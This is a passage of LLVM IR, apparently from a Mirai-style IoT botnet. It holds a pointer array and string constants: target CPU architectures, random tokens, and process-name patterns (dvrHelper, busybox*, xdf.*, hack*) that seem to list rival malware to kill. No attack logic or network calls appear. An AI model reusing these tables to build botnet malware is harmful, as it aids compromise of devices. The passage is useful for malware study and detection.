i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.255, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.257, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.258, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.259, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.260, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.261, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.262, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.263, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.264, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.265, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.266, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.267, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.268, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.269, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.270, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.271, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.272, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.273, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.274, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.275, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.276, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.277, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.278, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.279, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.280, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.281, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.282, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.283, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.284, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.285, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.286, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.287, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.288, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.289, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.290, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.291, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.292, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.293, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.294, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.295, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.296, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.297, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.298, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.299, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.300, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.301, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.302, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.303, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.304, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.305, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.306, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.307, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.308, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.311, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.312, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.313, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.315, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.316, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.317, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.318, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.319, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.320, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.321, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.322, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.323, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.324, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.327, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.331, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.341, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.344, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.345, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.346, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.347, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.348, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.349, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.350, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.364, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.365, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.366, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.367, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.368, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.369, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.370, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.371, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.372, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.373, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.374, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.375, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.376, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.377, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.378, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.379, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.380, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.381, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.382, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.383, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.384, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.385, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.386, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.387, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.388, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.389, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.390, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.391, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.392, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.393, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.394, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.395, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.396, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.397, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.398, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.399, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.400, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.401, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.402, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.403, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.404, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.405, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.406, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.407, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.408, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.409, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.410, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.411, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.412, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.413, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.414, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.415, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.416, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.417, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.418, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.419, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.420, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.421, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.422, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.423, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.424, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.425, i32 0, i32 0)], align 16
@.str.77 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.78 = private unnamed_addr constant [7 x i8] c"mips64\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"sh2eb\00", align 1
@.str.81 = private unnamed_addr constant [7 x i8] c"sh2elf\00", align 1
@.str.82 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.83 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.85 = private unnamed_addr constant [6 x i8] c"armv5\00", align 1
@.str.86 = private unnamed_addr constant [8 x i8] c"armv4tl\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"armv4\00", align 1
@.str.88 = private unnamed_addr constant [6 x i8] c"armv6\00", align 1
@.str.89 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.90 = private unnamed_addr constant [8 x i8] c"powerpc\00", align 1
@.str.91 = private unnamed_addr constant [13 x i8] c"powerpc440fp\00", align 1
@.str.92 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.93 = private unnamed_addr constant [5 x i8] c"m68k\00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"sparc\00", align 1
@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.95 = private unnamed_addr constant [7 x i8] c"earyzq\00", align 1
@.str.96 = private unnamed_addr constant [7 x i8] c"cemtop\00", align 1
@.str.97 = private unnamed_addr constant [7 x i8] c"vtyhat\00", align 1
@.str.98 = private unnamed_addr constant [7 x i8] c"vvglma\00", align 1
@.str.99 = private unnamed_addr constant [7 x i8] c"nvitpj\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"razdzn\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"lnkfmx\00", align 1
@.str.102 = private unnamed_addr constant [7 x i8] c"qvmxvl\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"ajoomk\00", align 1
@.str.104 = private unnamed_addr constant [7 x i8] c"fwdfvf\00", align 1
@.str.105 = private unnamed_addr constant [7 x i8] c"atxhua\00", align 1
@.str.106 = private unnamed_addr constant [7 x i8] c"qtmzbn\00", align 1
@.str.107 = private unnamed_addr constant [7 x i8] c"adcvds\00", align 1
@.str.108 = private unnamed_addr constant [10 x i8] c"amsjkfbns\00", align 1
@.str.109 = private unnamed_addr constant [9 x i8] c"xdf.mips\00", align 1
@.str.110 = private unnamed_addr constant [6 x i8] c"xdf.*\00", align 1
@.str.111 = private unnamed_addr constant [5 x i8] c"xdf*\00", align 1
@.str.112 = private unnamed_addr constant [11 x i8] c"xdf.mipsel\00", align 1
@.str.113 = private unnamed_addr constant [11 x i8] c"xdf.x86_64\00", align 1
@.str.114 = private unnamed_addr constant [9 x i8] c"xdf.arm7\00", align 1
@.str.115 = private unnamed_addr constant [8 x i8] c"xdf.ppc\00", align 1
@.str.116 = private unnamed_addr constant [16 x i8] c"hex**hexxdf.sh4\00", align 1
@.str.117 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.118 = private unnamed_addr constant [6 x i8] c"jack*\00", align 1
@.str.119 = private unnamed_addr constant [6 x i8] c"hack*\00", align 1
@.str.120 = private unnamed_addr constant [11 x i8] c"arm*tel*b1\00", align 1
@.str.121 = private unnamed_addr constant [3 x i8] c"b2\00", align 1
@.str.122 = private unnamed_addr constant [3 x i8] c"b3\00", align 1
@.str.123 = private unnamed_addr constant [3 x i8] c"b4\00", align 1
@.str.124 = private unnamed_addr constant [3 x i8] c"b5\00", align 1
@.str.125 = private unnamed_addr constant [3 x i8] c"b6\00", align 1
@.str.126 = private unnamed_addr constant [3 x i8] c"b7\00", align 1
@.str.127 = private unnamed_addr constant [3 x i8] c"b8\00", align 1
@.str.128 = private unnamed_addr constant [3 x i8] c"b9\00", align 1
@.str.129 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str.130 = private unnamed_addr constant [6 x i8] c"orion\00", align 1
@.str.131 = private unnamed_addr constant [5 x i8] c"lol*\00", align 1
@.str.132 = private unnamed_addr constant [9 x i8] c"busybox*\00", align 1
@.str.133 = private unnamed_addr constant [8 x i8] c"badbox*\00", align 1
@.str.134 = private unnamed_addr constant [9 x i8] c"DFhxdhdf\00", align 1
@.str.135 = private unnamed_addr constant [10 x i8] c"dvrHelper\00", align 1
@.str.136 = private unnamed_addr constant [8 x i8] c"FDFDHFC\00", align 1
@.str.137 = private unnamed_addr constant [5 x i8] c"FEUB\00", align 1
@.str.138 = private unnamed_addr constant [9 x i8] c"FTUdftui\00", align 1
@.str.139 = private unnamed_addr constant [9 x i8] c"GHfjfgvj\00", align 1
@.str.140 = private unnamed_addr constant [6 x i8] c"jhUOH\00", align 1
@.str.141 = private unnamed_addr constant [9 x i8] c"JIPJIPJj\00", align 1
@.str.142 = private unnamed_addr constant [10 x i8] c"JIPJuipjh\00", align 1
@.str.143 = private unnamed_addr constant [10 x i8] c"kmyx86_64\00", align 1
@.str.144 = private unnamed_addr constant [10 x i8] c"lolmipsel\00", align 1
@.str.145 = private unnamed_addr constant [8 x i8] c"RYrydry\00", align 1
@.str.146 = private unnamed_addr constant [9 x i8] c"TwoFace*\00", align 1
@.str.147 = private unnamed_addr constant [9 x i8] c"UYyuyioy\00", align 1
@.str.148 = private unnamed_addr constant [9 x i8] c"XDzdfxzf\00", align 1
@.str.149 = private unnamed_addr constant [4 x i8] c"xx*\00", align 1
@.str.150 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.151 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.152 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.153 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.154 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.155 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.156 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.157 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.158 = private unnamed_addr constant [2 x i8] c"8\00", align 1
